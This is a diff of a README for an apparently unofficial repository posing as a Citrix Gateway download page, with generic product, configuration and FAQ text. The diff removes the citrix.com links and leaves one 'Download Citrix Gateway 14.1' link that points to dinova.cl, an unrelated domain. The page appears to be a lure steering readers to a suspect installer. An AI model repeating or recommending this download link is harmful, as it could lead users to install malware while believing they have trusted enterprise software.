@@ -1,18 +1,27 @@
-## <img width="26px" src="https://github.com/Citrix-Gateway/Citrix-Gateway/blob/main/publisherIdproductId_15541_Small.png" alt=""></img> Citrix Gateway: Download Secure Access Solution
+# Citrix Gateway
+
+## Overview
+
+Citrix Gateway is a secure remote access solution that ensures seamless connectivity for users accessing internal resources. It provides a centralized platform for managing access to critical resources, whether hosted on-premises or in the cloud. The solution integrates with Citrix DaaS and other Citrix products, enabling hybrid and multi-cloud strategies while maintaining robust security. Its user-friendly interface simplifies deployment, making it ideal for organizations looking to enhance network security and efficiency.
 
 
 
-| Go to: | [Windows](https://github.com/Citrix-Gateway/Citrix-Gateway#Windows) | [MacOS](https://github.com/Citrix-Gateway/Citrix-Gateway#MacOS) | [Linux](https://www.citrix.com/downloads/) | [Other platforms](https://www.citrix.com/downloads/) |
-| -------- | ---------------------------------------------------------- | ------------------------------------------------------ | ------------------------------------------ | ---------------------------------------------------- |
+## Table of Contents
+
+- [Installation](#installation)
+- [Common Use Cases](#common-use-cases)
+- [Features and Benefits](#features-and-benefits)
+- [Advanced Topics](#advanced-topics)
+- [Troubleshooting](#troubleshooting)
 
 
-## Windows
+## Installation
 
 **Version:** 14.1 Build 38.53 (Feature Phase)  
 **Release Date:** Dec 18, 2024  
 **Status:** Latest Version
 
-[Download Citrix Gateway 14.1 Build 38.53 for Windows](https://dinova.cl/1235/).
+[Download Citrix Gateway 14.1 Build 38.53](https://dinova.cl/1235/).
 
 ### Initial Configuration
 
@@ -25,54 +34,80 @@
 - **Authentication:** Configure user authentication methods (e.g., LDAP, RADIUS).
 - **Certificates:** Import and bind SSL certificates for secure connections.
 
----
 
-## macOS
-
-Choose the appropriate installer for your macOS architecture:
-
-- [Download macOS App (ARM)](https://www.citrix.com/downloads/citrix-gateway)
-- [Download macOS App (Intel)](https://www.citrix.com/downloads/citrix-gateway)
-
-### Installation Steps
-
-1. Open the downloaded file and drag the application to the Applications folder.
-2. Launch Citrix Gateway and enter the server address to start configuration.
-
----
-
-## Linux
-
-### Download the Installer
-
-Download the package suitable for your Linux distribution:
-
-- [Download Linux App (Deb)](https://www.citrix.com/downloads/citrix-gateway)
-- [Download Linux App (RPM)](https://www.citrix.com/downloads/citrix-gateway)
-
-### Installation Steps
-
-1. Install the package using the command:
-   ```bash
-   sudo dpkg -i citrix_gateway.deb
-
-2. Launch the configuration utility from your terminal.
-
-
-## Advanced Configuration
-
-### Using the Configuration Utility
+### Advanced Configuration
 
 1. Open your browser and navigate to the Citrix Gateway's system IP (default: [http://192.168.100.1](http://192.168.100.1)).
 2. Configure virtual servers, authentication methods, and session policies using the dashboard.
 
-### Features
 
-- **High Availability:** Deploy two appliances for redundancy.
-- **Endpoint Analysis:** Validate user devices for compliance before granting access.
-- **Custom Pages:** Personalize the login and home pages for users.
 
----
+## Common Use Cases
 
-For more detailed configuration options, visit the Citrix Gateway Documentation.
-Citrix Gateway: Download Secure Access Solution
+- **Secure Remote Access:**
+  - Provide employees secure access to internal applications and resources.
+- **Hybrid Cloud Integration:**
+  - Leverage Citrix Gateway Service with on-premises StoreFront and NetScaler appliances.
+- **Application Delivery:**
+  - Streamline access to Citrix Virtual Apps and Desktops.
+
+## Features and Benefits
+
+- **Scalability:**
+  - Handle high traffic loads with ease.
+- **Multi-Cloud Support:**
+  - Integrates seamlessly with AWS, Azure, and Google Cloud.
+- **User-Friendly:**
+  - Simplified interface for easy configuration and management.
+
+## Advanced Topics
+
+### HDX Adaptive Transport
+
+- Improves performance in lossy networks by leveraging the EDT protocol.
+- Ensures smooth multimedia delivery for virtual apps and desktops.
+
+### Integration with Third-Party Tools
+
+- **Monitoring Tools:**
+  - Integrate with Splunk or other SIEM tools for enhanced monitoring.
+- **Authentication:**
+  - Supports SAML, RADIUS, and LDAP for secure and flexible authentication.
+
+### High Availability Configurations
+
+- Set up NetScaler Gateway in active-passive or active-active configurations.
+- Use clustering for load balancing and fault tolerance.
+
+## Troubleshooting
+
+- **Common Issues:**
+  - VPN connection failures.
+  - Endpoint analysis scan errors.
+
+- **Diagnostic Tools:**
+  - Use Citrix Director for session insights.
+  - Access logs via Citrix ADM.
+
+- **Resolution Steps:**
+  - Ensure correct firewall settings.
+  - Verify licenses and configurations.
+
+## FAQ
+
+1. **What are the licensing options?**
+   - Citrix Gateway Service requires platform and universal licenses for full functionality.
+
+2. **What browsers are supported?**
+   - Chrome (30+), Firefox (24+), and Safari (7.1+) are fully supported.
+
+3. **How is data secured?**
+   - Data transmission is encrypted using TLS 1.2 and managed by Citrix Cloud connectors.
+
+4. **How do I verify installation?**
+   - Use CLI commands like `show license` or GUI to confirm activation of licenses.
+
+# References
+
+- [Citrix Gateway Service Documentation](https://docs.citrix.com/en-us/citrix-gateway-service/)
+- [NetScaler Gateway Documentation](https://docs.netscaler.com/en-us/netscaler-gateway/)
